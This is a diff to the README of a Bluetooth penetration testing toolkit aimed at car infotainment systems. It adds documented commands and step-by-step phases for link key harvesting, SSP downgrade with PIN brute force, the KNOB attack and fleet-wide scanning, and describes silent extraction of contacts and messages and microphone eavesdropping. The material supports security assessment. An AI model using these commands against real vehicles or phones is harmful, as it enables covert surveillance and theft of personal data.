@@ -25,7 +25,11 @@
   - [Denial of Service](#9-denial-of-service)
   - [MAC Spoofing](#10-mac-address-spoofing)
   - [Automation and Orchestration](#11-automation-and-orchestration)
-  - [Session Management and Reporting](#12-session-management-and-reporting)
+  - [Link Key Harvest](#12-link-key-harvest-and-persistent-access)
+  - [SSP Downgrade](#13-ssp-downgrade-attack)
+  - [KNOB Attack](#14-knob-attack-cve-2019-9506)
+  - [Fleet-Wide Assessment](#15-fleet-wide-assessment)
+  - [Session Management and Reporting](#16-session-management-and-reporting)
 - [Quick Start](#quick-start)
 - [Usage Guide](#usage-guide)
 - [Workflows](#workflows)
@@ -33,6 +37,7 @@
 - [Troubleshooting](#troubleshooting)
 - [Platform Notes](#platform-notes)
 - [Legal Disclaimer](#legal-disclaimer)
+- [Changelog](docs/CHANGELOG.md)
 
 ---
 
@@ -42,14 +47,18 @@ Blue-Tap is a comprehensive Bluetooth and BLE penetration testing toolkit design
 
 ### What Blue-Tap Does
 
-- **Discovers** Bluetooth Classic and BLE devices in range, identifying IVI systems by device class, name, and service profile
-- **Fingerprints** target devices to determine Bluetooth version, chipset, supported profiles, pairing mode, and IO capabilities
-- **Assesses vulnerabilities** with 20+ evidence-based checks covering known CVEs (KNOB, BLURtooth, BIAS, BlueBorne, PerfektBlue, BrakTooth, BLUFFS, Invalid Curve) and configuration weaknesses
-- **Extracts data** via PBAP (phonebook, call logs), MAP (SMS/MMS messages), AT commands (device info, phonebook, SMS), and OBEX Object Push
-- **Hijacks connections** by impersonating a paired phone via MAC spoofing and identity cloning to access the IVI without re-pairing
-- **Intercepts audio** through HFP (call audio capture/injection) and A2DP (media stream capture, mic eavesdropping)
-- **Fuzzes protocols** with a multi-protocol campaign engine supporting 8 Bluetooth protocols, 4 mutation strategies, crash database, corpus management, and crash minimization
-- **Generates reports** in HTML and JSON formats with vulnerability findings, extracted data, and fuzzing results
+- **Discovers** Bluetooth Classic and BLE devices in range, classifying IVI systems by device class, name heuristics, and service UUIDs. Fleet-wide scanning assesses all nearby devices in one pass.
+- **Fingerprints** target devices to determine Bluetooth version, LMP features, chipset manufacturer, supported profiles, pairing mode, IO capabilities, and attack surface.
+- **Assesses vulnerabilities** with 20+ evidence-based checks covering known CVEs (KNOB, BLURtooth, BIAS, BlueBorne, PerfektBlue, BrakTooth, BLUFFS, Invalid Curve, SweynTooth) and configuration weaknesses. Each finding includes severity, confidence, CVE reference, evidence, and remediation.
+- **Extracts data** via PBAP (phonebook, call logs, favorites), MAP (SMS/MMS/email messages), AT commands (IMEI, IMSI, phonebook, SMS), and OBEX Object Push — all without user awareness on the IVI.
+- **Hijacks connections** by impersonating a paired phone (MAC + name + device class cloning) to access the IVI without re-pairing. Supports BIAS (CVE-2020-10135) role-switch authentication bypass for devices that validate link keys.
+- **Harvests link keys** from captured pairing exchanges and stores them for persistent reconnection — proving that a single intercepted pairing gives indefinite access to the vehicle.
+- **Downgrades pairing security** by forcing SSP to legacy PIN mode and brute-forcing the PIN (0000-9999), or executing the KNOB attack (CVE-2019-9506) to negotiate minimum encryption key entropy.
+- **Intercepts audio** through HFP (call audio capture, DTMF injection, call control — dial, answer, hangup, hold) and A2DP (media stream capture, microphone eavesdropping, audio playback injection).
+- **Controls media** via AVRCP — play, pause, skip, volume manipulation, metadata surveillance. Skip flooding and volume ramp for DoS demonstration.
+- **Fuzzes 11 Bluetooth protocols** with a response-guided, state-aware fuzzing engine featuring 6 layers of intelligence: protocol state inference (AFLNet-adapted), anomaly-guided field mutation weights, structural PDU validation, timing-based coverage proxy, entropy-based leak detection, and watchdog reboot detection. Live dashboard with real-time crash tracking.
+- **Manages crashes** with SQLite-backed crash database, severity classification, reproduction verification, payload minimization (binary search + delta debugging + field-level reduction), and evidence export.
+- **Generates reports** in HTML and JSON with executive summary, SVG charts, vulnerability findings with evidence, fuzzing intelligence analysis (state coverage, field weights, timing clusters, health events), crash details with hexdumps and reproduction steps, and data extraction summaries.
 
 ### Who It's For
 
@@ -844,7 +853,79 @@ report
 
 ---
 
-### 12. Session Management and Reporting
+### 12. Link Key Harvest and Persistent Access
+
+Capture pairing exchanges, extract link keys, and reconnect to devices without re-pairing — proving persistent access.
+
+```bash
+blue-tap keys harvest <MAC>                            # Capture pairing + extract link key
+blue-tap keys harvest <MAC> -d 600                     # 10 minute capture window
+blue-tap keys list                                     # Show all stored keys
+blue-tap keys verify <MAC>                             # Verify stored key still works
+blue-tap keys reconnect <MAC>                          # Reconnect using stored key (no re-pairing)
+```
+
+**How it works:** Starts HCI packet capture, waits for a pairing exchange with the target, extracts the link key via tshark, and stores it in a persistent key database. Later, `keys reconnect` injects the stored key into BlueZ and connects without any pairing UI — demonstrating that a single intercepted pairing gives indefinite access.
+
+---
+
+### 13. SSP Downgrade Attack
+
+Force a device from Secure Simple Pairing to legacy PIN mode, then brute force the PIN.
+
+```bash
+blue-tap ssp-downgrade probe <MAC>                     # Check if target is vulnerable
+blue-tap ssp-downgrade attack <MAC>                    # Downgrade + auto brute force
+blue-tap ssp-downgrade attack <MAC> --pin-start 0 --pin-end 9999  # Full PIN range
+blue-tap ssp-downgrade attack <MAC> --delay 1.0        # Slower to avoid lockout
+```
+
+**Attack phases:**
+1. Set local adapter IO capability to NoInputNoOutput
+2. Disable SSP on local adapter
+3. Remove existing pairing with target
+4. Initiate pairing — target falls back to legacy PIN mode
+5. Brute force PIN (0000-9999) with lockout detection
+
+---
+
+### 14. KNOB Attack (CVE-2019-9506)
+
+Negotiate minimum encryption key entropy, then brute force the reduced key space.
+
+```bash
+blue-tap knob probe <MAC>                              # Check KNOB vulnerability
+blue-tap knob attack <MAC>                             # Full KNOB chain: negotiate + brute force
+blue-tap knob attack <MAC> --key-size 1                # Force 1-byte key (256 candidates)
+```
+
+**Attack phases:**
+1. Check BT version (KNOB affects 2.1-5.0 pre-patch)
+2. Negotiate encryption key to minimum bytes (via InternalBlue LMP injection or btmgmt fallback)
+3. Brute force the reduced key space (256 candidates for 1-byte key)
+
+Note: Full LMP-level manipulation requires InternalBlue (Broadcom/Cypress chipset). Without it, the btmgmt approach has limited effectiveness.
+
+---
+
+### 15. Fleet-Wide Assessment
+
+Scan all nearby Bluetooth devices, classify them, and run vulnerability assessments.
+
+```bash
+blue-tap fleet scan                                    # Discover + classify all nearby devices
+blue-tap fleet scan -d 30                              # 30-second scan window
+blue-tap fleet assess                                  # Scan + vuln-assess all IVIs
+blue-tap fleet assess --all-devices                    # Assess everything, not just IVIs
+blue-tap fleet report                                  # Full fleet report (scan + assess + HTML)
+blue-tap fleet report -f json -o fleet.json            # JSON output
+```
+
+**Device classification:** Automatically categorizes each device as IVI, phone, headset, computer, wearable, or unknown — based on Bluetooth device class, name heuristics (car OEMs, head-unit vendors), and service UUIDs.
+
+---
+
+### 16. Session Management and Reporting
 
 #### Sessions
 
